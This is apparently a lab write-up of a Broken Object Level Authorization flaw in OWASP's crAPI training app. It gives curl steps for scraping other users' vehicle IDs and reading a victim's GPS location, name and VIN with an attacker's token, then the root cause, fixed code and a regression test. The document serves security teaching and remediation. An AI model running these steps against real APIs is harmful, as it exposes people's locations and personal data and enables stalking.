# API1:2023 — Broken Object Level Authorization (BOLA)

**Target:** crAPI  
**Severity:** 🔴 Critical  
**CVSS Base Score:** 8.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`

---

## 1. Vulnerability Summary

Broken Object Level Authorization (BOLA) — also known as Insecure Direct Object Reference (IDOR) — occurs when an API exposes object identifiers (user IDs, vehicle IDs, order IDs) in requests and trusts the client to only access their own objects, without server-side verification.

In crAPI, authenticated users can retrieve and manipulate vehicle data, service history records, and coupon codes belonging to other users by simply substituting their own resource IDs with those of other users in API requests. The server never validates that the authenticated user owns the requested object.

This is consistently the **#1 most common and most impactful API vulnerability** found in real-world assessments.

---

## 2. Affected Endpoints

| Method | Endpoint | Parameter | Impact |
|--------|----------|-----------|--------|
| GET | `/identity/api/v2/vehicle/{vehicleId}/location` | vehicleId (UUID) | Read another user's GPS location |
| GET | `/workshop/api/mechanic/mechanic_report?report_id={id}` | report_id (integer) | Read other users' service reports |
| GET | `/community/api/v2/coupon/validate-coupon` | coupon_code | Access coupons not assigned to you |

---

## 3. Steps to Reproduce

### 3.1 Setup — Register Two Users

Register **User A** (attacker) and **User B** (victim) through the crAPI web UI at `http://localhost:8888`. Check MailHog at `http://localhost:8025` to complete email verification for both.

### 3.2 Capture User A's Auth Token

```bash
# Login as User A (attacker)
TOKEN_A=$(curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"Attacker@123"}' \
  | jq -r '.token')

echo "Attacker token: $TOKEN_A"
```

### 3.3 Enumerate User A's Own Vehicle ID

```bash
# Get attacker's own vehicles (note the vehicleId UUID)
curl -s -X GET http://localhost:8888/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer $TOKEN_A" \
  | jq '.vehicles'
```

**Sample response:**
```json
{
  "vehicles": [
    {
      "id": "3bef4a53-7f21-4112-9f61-6a1234abcd01",
      "vin": "4FMCU0F71KUA00001",
      "model": "Honda CR-V"
    }
  ]
}
```

### 3.4 Discover User B's Vehicle ID

BOLA exploits require knowing — or guessing — another user's object ID. In crAPI, vehicle IDs are UUIDs exposed in the community forum posts. Scrape them:

```bash
# Fetch community posts — vehicle IDs leak here
curl -s "http://localhost:8888/community/api/v2/community/posts/recent" \
  -H "Authorization: Bearer $TOKEN_A" \
  | jq '[.posts[] | {author: .author.nickname, vehicleId: .author.vehicleid}]'
```

**Sample output — victim's vehicleId is now known:**
```json
[
  { "author": "victim_user", "vehicleId": "9ace2178-bc12-4a99-b3d2-aabbcc112233" }
]
```

### 3.5 Access Victim's GPS Location Using Attacker's Token

```bash
VICTIM_VEHICLE_ID="9ace2178-bc12-4a99-b3d2-aabbcc112233"

curl -s -X GET \
  "http://localhost:8888/identity/api/v2/vehicle/${VICTIM_VEHICLE_ID}/location" \
  -H "Authorization: Bearer $TOKEN_A" \
  | jq .
```

---

## 4. Proof of Concept

**Request (attacker authenticated, requesting victim's vehicle):**
```http
GET /identity/api/v2/vehicle/9ace2178-bc12-4a99-b3d2-aabbcc112233/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...[ATTACKER_TOKEN]
```

**Response (server returns victim's real-time location — no authorization error):**
```json
{
  "vehicleLocation": {
    "id": 12,
    "latitude": "36.1627",
    "longitude": "-86.7816",
    "timestamp": "2024-11-15T14:32:01Z"
  },
  "fullName": "Jane Victim",
  "vehicleVIN": "1HGCM82633A004352"
}
```

**Key observation:** The server returned HTTP 200 with the victim's full name, real-time GPS coordinates, and VIN. The attacker's JWT was valid, but it authorized a different user's resource. **The server never checked ownership.**

---

## 5. Root Cause Analysis

The vulnerable server-side logic (pseudocode) looks like this:

```python
# VULNERABLE — checks authentication only, not authorization
@app.route("/identity/api/v2/vehicle/<vehicle_id>/location")
@jwt_required()            # ✅ Checks: "Is this user logged in?"
def get_vehicle_location(vehicle_id):
    vehicle = Vehicle.query.get(vehicle_id)   # ← fetches ANY vehicle by ID
    if not vehicle:
        return 404
    return vehicle.location    # ← returns it without ownership check ❌
```

The JWT middleware confirms the user is **authenticated** (logged in), but no code checks whether `vehicle.owner_id == current_user.id`. The server trusts the client-supplied `vehicle_id` completely.

---

## 6. Business Impact

| Impact | Description |
|--------|-------------|
| Privacy breach | Real-time GPS location of any user's vehicle is exposed |
| Stalking / physical safety | An attacker can track a specific user's movements |
| Data theft | Service history, PII, and vehicle data of all users accessible |
| Regulatory exposure | GDPR / CCPA violation — personal location data of users |
| Reputational damage | Breach disclosure would destroy user trust |

In a real-world automotive or ride-share application, this class of vulnerability has resulted in multi-million dollar settlements and regulatory action.

---

## 7. Remediation

### Fix — Server-Side Ownership Validation

```python
# FIXED — checks both authentication AND authorization
@app.route("/identity/api/v2/vehicle/<vehicle_id>/location")
@jwt_required()
def get_vehicle_location(vehicle_id):
    current_user_id = get_jwt_identity()
    vehicle = Vehicle.query.get(vehicle_id)

    if not vehicle:
        return jsonify({"error": "Not found"}), 404

    # ✅ Authorization check — does THIS user own THIS vehicle?
    if str(vehicle.owner_id) != str(current_user_id):
        return jsonify({"error": "Forbidden"}), 403    # Never 404 — avoid enumeration

    return jsonify(vehicle.location), 200
```

### Defense-in-Depth Recommendations

1. **Never expose sequential integer IDs** — use UUIDs or opaque tokens that can't be guessed/enumerated
2. **Log authorization failures** — a spike in 403s on resource endpoints is a BOLA attack indicator
3. **Rate limit resource endpoints** — slow down enumeration attempts
4. **Add BOLA to your threat model** — every endpoint that takes an object ID is a potential BOLA surface

### Unit Test That Would Catch This in CI

```python
def test_vehicle_location_rejects_cross_user_access(client, user_a_token, user_b_vehicle_id):
    """Ensure User A cannot read User B's vehicle location."""
    response = client.get(
        f"/identity/api/v2/vehicle/{user_b_vehicle_id}/location",
        headers={"Authorization": f"Bearer {user_a_token}"}
    )
    assert response.status_code == 403, (
        f"Expected 403 Forbidden, got {response.status_code}. "
        f"BOLA vulnerability present — cross-user vehicle access allowed."
    )
```

---

## 8. Tools Used

| Tool | Purpose |
|------|---------|
| curl + jq | Request crafting and response parsing |
| Burp Suite | Traffic interception and manual replay |
| crAPI | Target application |

---

## 9. References

- [OWASP API1:2023 — BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [PortSwigger — IDOR](https://portswigger.net/web-security/access-control/idor)
- [crAPI BOLA Challenge Guide](https://github.com/OWASP/crAPI/blob/develop/docs/challenges.md)

---

*Next: [API2 — Broken Authentication →](./API2-BrokenAuth.md)*
